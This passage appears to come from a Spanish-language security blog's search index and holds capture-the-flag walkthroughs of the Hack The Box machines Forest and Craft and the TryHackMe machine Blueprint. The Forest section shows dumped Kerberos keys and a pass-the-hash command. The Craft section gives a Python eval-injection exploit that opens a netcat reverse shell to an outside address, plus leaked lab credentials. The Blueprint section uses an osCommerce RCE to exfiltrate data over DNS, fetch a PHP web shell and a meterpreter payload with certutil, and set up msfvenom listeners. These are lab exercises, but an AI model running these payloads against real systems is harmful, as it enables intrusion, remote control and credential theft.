htb.local\\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a htb.local\\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2 htb.local\\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29 htb.local\\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7 htb.local\\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538 htb.local\\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702 htb.local\\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352 htb.local\\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d htb.local\\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701 htb.local\\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd htb.local\\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36 htb.local\\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb htb.local\\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c htb.local\\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3 htb.local\\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054 htb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161 htb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a htb.local\\sebastien:des-cbc-md5:702a3445e0d65b58 htb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5 htb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad htb.local\\lucinda:des-cbc-md5:a13bb56bd043a2ce htb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32 htb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea htb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294a htb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f htb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6 htb.local\\andy:des-cbc-md5:a2ab5eef017fb9da htb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6 htb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81 htb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9 htb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427 htb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25 htb.local\\santi:des-cbc-md5:4075ad528ab9e5fd FOREST$:aes256-cts-hmac-sha1-96:d409d743b2d787ba4a45692058388533840bb55a4d1fd65f8e345164d2df5078 FOREST$:aes128-cts-hmac-sha1-96:c7306933e272b5b5992f9c9ff688eaa2 FOREST$:des-cbc-md5:c8132fbf73c71fa8 EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6 EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e EXCH01$:des-cbc-md5:8c45f44c16975129 [*] Cleaning up...   Logramos obtener los hashes de la mayoria de usuarios, podemos obtener el de un solo usuario, en este caso el que nos interesa es el del usuario administrator.\n1 2 3 4 5 6 7  root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc-user administrator Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: [*] Cleaning up...   Utilizamos psexec.py para obtener nuestra flag root.txt y una shell.\nrlwrap psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 ","description":"","id":61,"section":"posts","tags":["windows"],"title":"Hack The Box - Forest","uri":"https://sckull.github.io/posts/forest/"},{"content":"Craft es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Craft     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.110   Maker rotarydrone    MASSCAN 1 2 3 4 5 6 7 8 9  masscan -p1-65535,U:1-65535 10.10.10.110 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-30 06:56:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.110 Discovered open port 443/tcp on 10.10.10.110 Discovered open port 6022/tcp on 10.10.10.110   NMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # Nmap 7.70 scan initiated Tue Jul 30 03:13:35 2019 as: nmap -sV -sC -p 22,443,6022 -o nmap.scan 10.10.10.110 Nmap scan report for 10.10.10.110 Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |_http-server-header: nginx/1.15.8 |_http-title: About | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 6022/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port6022-TCP:V=7.70%I=7%D=7/30%Time=5D3FEE27%P=x86_64-pc-linux-gnu%r(NU SF:LL,C,\u0026#34;SSH-2\\.0-Go\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 30 03:14:26 2019 -- 1 IP address (1 host up) scanned in 51.23 seconds   HTTPS Visitamos la pagina en HTTPS nos muestra un mensaje que nos habla de una rest API.\nSubdominios Nos movilizamos atravez de las diferentes rutas que nos provee la pagina y encontramos un dominio y dos subdominios, los cuales agregamos a nuestro archivo /etc/hosts.\ncraft.htb api.craft.htb gogs.craft.htb https://api.craft.htb/api/ En la pagina de api nos meustra distintas opciones con las cuales podemos interactuar con una interfaz y tambien nos provee diferentes comandos con curl, para hacer solicitudes a la API.\nhttps://gogs.craft.htb/ En la pagina de gogs nos encontramos con la plataforma gogs que permite el gestionamiento de repositorios, dentro de la misma plataforma nos encontramos con un repositorio.\nCRAFT API Analizamos el codigo que se encuentra en el repositorio el cual pertenece a la rest API que nos menciona la pagina principal (craft.htb), contiene toda la estructura de como funciona esta API. Dentro, encontramos que se hizo un cambio a una parte de codigo que pertenece a la creacion de un nuevo brew de la API.\nDicho cambio incluye una porcion de codigo de python que es vulnerable a ejecucion de comandos remota o RCE.\nPorcion de codigo vulnerable especificamente eval():\n1 2  if eval(\u0026#39;%s\u0026gt; 1\u0026#39; % request.json[\u0026#39;abv\u0026#39;]): return \u0026#34;ABV must be a decimal value less than 1.0\u0026#34;, 400   Python Code Injection\nAdemas de eso encontramos un archivo test.py que contiene un usuario y contraseña para generar un token, para luego crear un \u0026lsquo;brew\u0026rsquo; insatisfactorio y satisfactoriamente. El primero contiene un numero con punto decimal mayor a 1 que debe de ser rechazado por la API. El segundo un numero menor a 1 con punto decimal que debe de ser aceptado por la API.\nArchivo test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  #!/usr/bin/env python import requests import json response = requests.get(\u0026#39;https://api.craft.htb/api/auth/login\u0026#39;, auth=(\u0026#39;dinesh\u0026#39;, \u0026#39;4aUh0A8PbVJxgd\u0026#39;), verify=False) json_response = json.loads(response.text) token = json_response[\u0026#39;token\u0026#39;] headers = { \u0026#39;X-Craft-API-Token\u0026#39;: token, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } # make sure token is valid response = requests.get(\u0026#39;https://api.craft.htb/api/auth/check\u0026#39;, headers=headers, verify=False) print(response.text) # create a sample brew with bogus ABV... should fail. print(\u0026#34;Create bogus ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = \u0026#39;15.0\u0026#39; brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text) # create a sample brew with real ABV... should succeed. print(\u0026#34;Create real ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = \u0026#39;0.15\u0026#39; brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text)   Prueba del archivo test.py:\nRCE - Craft API Para poder ejecutar comandos y obtener una shell inversa a travez de la vulnerabilidad que encontramos en el codigo del repositorio vamos a modificar el archivo test.py, agregandole un comando que va a ser ejecutado por la funcion eval(). Agregamos nuestra shell inversa \u0026ldquo;escapando\u0026rdquo; todas los backslash que se encuentran para no tener ningun problema al ejecutarse. Y Ponemos a la escucha nuestra maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  #!/usr/bin/env python import requests import json response = requests.get(\u0026#39;https://api.craft.htb/api/auth/login\u0026#39;, auth=(\u0026#39;dinesh\u0026#39;, \u0026#39;4aUh0A8PbVJxgd\u0026#39;), verify=False) json_response = json.loads(response.text) token = json_response[\u0026#39;token\u0026#39;] headers = { \u0026#39;X-Craft-API-Token\u0026#39;: token, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } # make sure token is valid response = requests.get(\u0026#39;https://api.craft.htb/api/auth/check\u0026#39;, headers=headers, verify=False) print(response.text) a = \u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;rm \\/tmp\\/f;mkfifo \\/tmp\\/f;cat \\/tmp\\/f|\\/bin\\/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.184 8878 \u0026gt;\\/tmp\\/f\u0026#39;).read()\u0026#34; # create a sample brew with real ABV... should succeed. print(\u0026#34;Create real ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = a brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text)   Al ejecutar el script obtenemos una shell inversa:\nMYSQL - Dump Credentials Dentro del sistema de archivos encontramos los mismos archivos pertenecientes al repositorio, al ejecutar el archivo de dbtest.py obtenemos una respuesta de la base de datos MySQL.\nArchivos:\nPrueba dbtest.py\nArchivo settings.py con credenciales de la base de datos:\nPara poder obtener Credenciales que se encuentran en la base de datos utilizamos nuevamente el repositorio, ya que en este se encuentra el modelo de las tablas de la base de datos, brew y user, por lo que podemos obtener facilmente las columnas y el nombre de las tablas.\ncraft_api/database/models.py\nPara realizar un query a la base de datos utilizamos y modificamos el archivo dbtest.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  #!/usr/bin/env python import pymysql import sys from craft_api import settings connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor) try: with connection.cursor() as cursor: sql = sys.argv[1] cursor.execute(sql) result = cursor.fetchall() print(result) finally: connection.close()   Teniendo nuestro archivo listo utilizamos el siguiente query para obtener los datos:\n1  SELECT * FROM user   Archivo dbtest.py modificado:\nObtenemos las credenciales que estan dentro de la base de datos, una de ellas ya la teniamos dentro del script test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  [ { \u0026#39;id\u0026#39;:1, \u0026#39;username\u0026#39;:\u0026#39;dinesh\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;4aUh0A8PbVJxgd\u0026#39; }, { \u0026#39;id\u0026#39;:4, \u0026#39;username\u0026#39;:\u0026#39;ebachman\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;llJ77D8QFkLPQB\u0026#39; }, { \u0026#39;id\u0026#39;:5, \u0026#39;username\u0026#39;:\u0026#39;gilfoyle\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;ZEU3N8WNM2rh4T\u0026#39; } ]   USER gilfoyle - SHELL SSH Obtuvimos las credenciales de 3 \u0026ldquo;usuarios\u0026rdquo;, ninguno de ellos funciona en el servicio de SSH, pero dos de ellos si funcionan en la plataforma Gogs.\nPor un lado tenemos al usuario dinesh quien puede realizar cambios dentro del codigo del repositorio de la API de craft.\nCon el usuario gilfoyle nos muestra un repositorio más al del usuario dinesh este nos muestra como esta la infraestructura del \u0026lsquo;servidor\u0026rsquo;. Entre las cosas que tiene este repositorio encontramos el \u0026lsquo;craft-flask\u0026rsquo; el cual contiene la informacion para la Shell de privilegios bajos con la que pudimos obtener las credenciales, y, tambien informacion del servidor nginx, mysql, vault y ssh.\nEn la carpeta .ssh encontramos la clave publica y privada del usuario gilfoyle perteneciente al servicio de SSH, utilizamos dicha clave para obtener una shell SSH. Al utilizar la clave nos pide una frase utilizamos la contraseña (ZEU3N8WNM2rh4T) que encontramos en la base de datos de este usuario.\nObtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Nuevamente volvemos al repositorio donde encontramos la infraestructura que tiene el servidor, dentro, encontramos en la carpeta vault la configuracion de esta plataforma, esta plataforma da el acceso y control de contraseñas, certificados, claves de APIs, contraseñas, etc.\n1 2 3 4 5 6 7 8 9 10  storage \u0026#34;file\u0026#34; { path = \u0026#34;/vault/data\u0026#34; } ui = false listener \u0026#34;tcp\u0026#34; { address = \u0026#34;0.0.0.0:8200\u0026#34; tls_cert_file = \u0026#34;/vault/pki/vault.craft.htb.crt\u0026#34; tls_key_file = \u0026#34;/vault/pki/vault.craft.htb.key\u0026#34; tls_min_version = \u0026#34;tls12\u0026#34; }   Revisamos la documentacion de esta plataforma y las opciones que contiene este archivo. Encontramos que la plataforma esta corriendo en el puerto 8200 y su interfaz grafica (ui) esta desactivada. Dentro de la maquina especificamente en el archivo /etc/hosts encontramos que la plataforma esta configurada en la ip y dominio:\n1  172.20.0.2 vault.craft.htb   Comprobamos que la interfaz grafica este desactivada traemos 172.20.0.2 con el puerto 8200 localmente:\n1  ssh -L 8200:172.20.0.2:8200 gilfoyle@10.10.10.110 -i gilfoyle_id_rsa   SSH Local Pudimos comprobar que la plataforma esta desactivada graficamente.\nROOT - One Time Password One time password permite a algun usuario crear una contraseña cada vez que lo desee conectarse en el servicio SSH mediante comandos. De igual forma dentro del repositorio encontramos un archivo llamado secret.sh el cual contiene una configuracion para activar ssh, crear un Rol con el usuario root con las IP que se representen dentro de cidr_list.\nOne Time SSH\n1 2 3 4 5 6  vault secrets enable ssh vault write ssh/roles/root_otp \\ key_type=otp \\ default_user=root \\ cidr_list=0.0.0.0/0   Utilizamos el archivo secrets.sh, lo modificamos y lo ejecutamos:\n1 2 3 4 5 6  vault secrets enable ssh vault write ssh/roles/root_otp \\ key_type=otp \\ default_user=root \\ cidr_list=172.20.0.0/0   Creamos una credencial para nuestra ip con el rol de root_otp.\n1  vault write ssh/creds/root_otp ip=172.20.0.1   Cuando creamos nuestra credencial nos muestra los detalles:\nUtilizamos la clave (key) como contraseña:\nkey: 70a2c9bc-4644-8bbd-f010-0c08193a3b7f Nos conectamos mediante ssh al usuario root localmente (0.0.0.0):\nssh root@0.0.0.0 Obtenemos una shell como usuario root y nuestra flag root.txt:\n","description":"","id":62,"section":"posts","tags":["linux"],"title":"Hack The Box - Craft","uri":"https://sckull.github.io/posts/craft/"},{"content":"Blueprint es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Blueprint     Info Hack into this Windows machine and escalate your privileges to Administrator.   Puntos 565   Dificultad Facil   Maker MrSeth6797    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80  root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-13 06:32:11 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49154/tcp on blueprint.thm Discovered open port 49159/tcp on blueprint.thm Discovered open port 137/udp on blueprint.thm Discovered open port 135/tcp on blueprint.thm Discovered open port 8080/tcp on blueprint.thm Discovered open port 139/tcp on blueprint.thm Discovered open port 3306/tcp on blueprint.thm Discovered open port 49152/tcp on blueprint.thm Discovered open port 445/tcp on blueprint.thm Discovered open port 49160/tcp on blueprint.thm Discovered open port 49153/tcp on blueprint.thm Discovered open port 49155/tcp on blueprint.thm Discovered open port 443/tcp on blueprint.thm # Nmap 7.80 scan initiated Fri Dec 13 00:33:25 2019 as: nmap -sV -sC -o nmap_scan blueprint.thm Nmap scan report for blueprint.thm (blueprint.thm) Host is up (0.23s latency). Not shown: 987 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: 404 - File or directory not found. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |_http-title: Bad request! | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |_http-title: Index of / 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 0s, deviation: 1s, median: 0s |_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:a9:aa:22:09:2e (unknown) | smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1 | Computer name: BLUEPRINT | NetBIOS computer name: BLUEPRINT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-12-13T06:35:06+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-12-13T06:35:05 |_ start_date: 2019-12-13T06:32:08 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Dec 13 00:35:22 2019 -- 1 IP address (1 host up) scanned in 116.94 seconds   HTTP Encontramos que en el puerto 8080 esta corriendo osCommerce.\nGOBUSTER Utilzamos gobuster en el directorio de oscommers para buscar archivos que puedan ser de utilidad.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  root@aoiri:~/tryhackme/blueprint# gobuster dir -u http://blueprint.thm:8080/oscommerce-2.3.4/catalog/ -x php,html,txt,aspx,asp -t 15 -q -w /usr/share/wordlists/dirb/common.txt /account_history.php (Status: 302) /account_edit.php (Status: 302) /ADMIN (Status: 301) /admin (Status: 301) /Admin (Status: 301) /advanced_search.php (Status: 200) /com2 (Status: 403) /com2.php (Status: 403) /com2.html (Status: 403) /com2.txt (Status: 403) /com2.aspx (Status: 403) /com2.asp (Status: 403) /com3 (Status: 403) /com3.aspx (Status: 403) /com3.asp (Status: 403) /com3.php (Status: 403) /com3.html (Status: 403) /com3.txt (Status: 403) /conditions.php (Status: 200) /contact_us.php (Status: 200) /cookie_usage.php (Status: 200) /Download (Status: 401) /Download.php (Status: 200) /download (Status: 401) /download.php (Status: 200) /ext (Status: 301) /images (Status: 301) /Images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /Index.php (Status: 200) /Login.php (Status: 200) /login.php (Status: 200) /lpt1 (Status: 403) /lpt1.txt (Status: 403) /lpt1.aspx (Status: 403) /lpt1.asp (Status: 403) /lpt1.php (Status: 403) /lpt1.html (Status: 403) /lpt2 (Status: 403) /lpt2.php (Status: 403) /lpt2.html (Status: 403) /lpt2.txt (Status: 403) /lpt2.aspx (Status: 403) /lpt2.asp (Status: 403) /nul (Status: 403) /nul.php (Status: 403) /nul.html (Status: 403) /nul.txt (Status: 403) /nul.aspx (Status: 403) /nul.asp (Status: 403) /opensearch.php (Status: 200) /popup_image.php (Status: 200) /prn (Status: 403) /prn.php (Status: 403) /prn.html (Status: 403) /prn.txt (Status: 403) /prn.aspx (Status: 403) /prn.asp (Status: 403) /product_reviews.php (Status: 302) /products_new.php (Status: 200) /pub (Status: 301) /redirect.php (Status: 302) /reviews.php (Status: 200) /shipping.php (Status: 200) /shopping_cart.php (Status: 200) /specials.php (Status: 200) /ssl_check.php (Status: 200) /tell_a_friend.php (Status: 302)   SEARCSPLOIT Con el nombre y la version de oscommerce encontramos varias vulnerabilidades y exploits que afectan a esta plataforma.\nosCommerce 2.3.4.1 - Remote Code Execution Utilizamos el exploit Remote Code Execution, nos permitira ejecutar comandos en el sistema, pero para ello debemos de configurar la ruta de la maquina en el exploit, de igual forma el payload que ejecuta una shell inversa no funciona ya que es un sistema windows.\nPara poder ver el resultado de la ejecucion de nuestro comando podemos utilizar la tecnica de DNS exfil (y por los loles xd).\nNuestro payload se veria de la siguiente forma si deseamos ver el path donde estamos actualmente.\n1  cmd.exe /C cd c:/ \u0026amp; 10.8.1.72 \u0026amp; for /f %i in (\\\u0026#39; @echo %cd% \\\u0026#39;) do nslookup %i 10.8.1.72   Con la configuracion (IP, Puerto y directorio de la plataforma) realizada, podemos correr responder en la interfaz tun0, y al lanzar nuestro exploit nos aparecera la ruta en una solicitud de DNS de responder.\nVemos que desordenada la informacion pero el path actual es:\nC:/xampp/htdocs/oscommerce.2.3.4/catalog/install/includes/ Sabiendo esto podemos verificar si podemos escribir y crear dentro de archivos con el payload:\n1 2 3 4  payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C echo \\\u0026#39;hello\\\u0026#39; \u0026gt; hehe.txt \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39;   Vemos que que el archivo se creó exitosamente:\nUtilizamos este pequeño codigo php para ejecutar comandos, lo alojamos en nuestra maquina y levantamos un servidor web con python3:\n1  \u0026lt;?php echo shell_exec($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;   Nuestro payload para descargar el archivo en la maquina utilizando certutil:\n1 2 3 4  payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C certutil -urlcache -split -f http://10.8.1.72/shell.php shell.php \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39;   Vemos nuestro archivo y ejecutamos comandos:\nTenemos permisos de administrador en la maquina y podemos ver la direccion actual en la que nos encontramos, de igual forma podemos leer nuestra bandera que se encuentra en el directorio del usuario administrator.\nShell - Metasploit Utilizando metasploit con certutil podemos obtener una shell y sacar el archivo que contiene los hash de los usuarios en windows para ello vamos a crear nuestro payload con msfvenom y poner a la escucha metasploit.\nMsfvenom:\n1  msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=1338 -f exe \u0026gt; shell.exe   Metasploit:\n1 2 3 4 5  use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 1338 exploit   Payload - exploit osCommerce:\n1 2 3 4  payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe \u0026amp; shell.exe \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39;   Obtuvimos una sesion meterpreter:\nPara obtener los hash utilizamos el comando hashdump, los cuales podemos crackear utilizando john o hashcat:\n","description":"","id":63,"section":"posts","tags":["windows","DNS exfil"],"title":"TryHackMe - Blueprint","uri":"https://sckull.github.io/posts/blueprint/"},{"content":"Wgel CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Wgel CTF     Info Can you exfiltrate the root flag?   Puntos 627   Dificultad Facil   Maker MrSeth6797    NMAP Escaneo de puertos tcp, vemos dos puertos abiertos http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # Nmap 7.80 scan initiated Fri Dec 27 19:44:55 2019 as: nmap -p- --min-rate 1000 -o scannmap 10.10.116.173 Nmap scan report for 10.10.116.173 Host is up (0.20s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Dec 27 19:46:23 2019 -- 1 IP address (1 host up) scanned in 87.39 seconds Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-27 19:47 CST Nmap scan report for 10.10.116.173 Host is up (0.43s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) |_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) 80/tcp open http Apache httpd 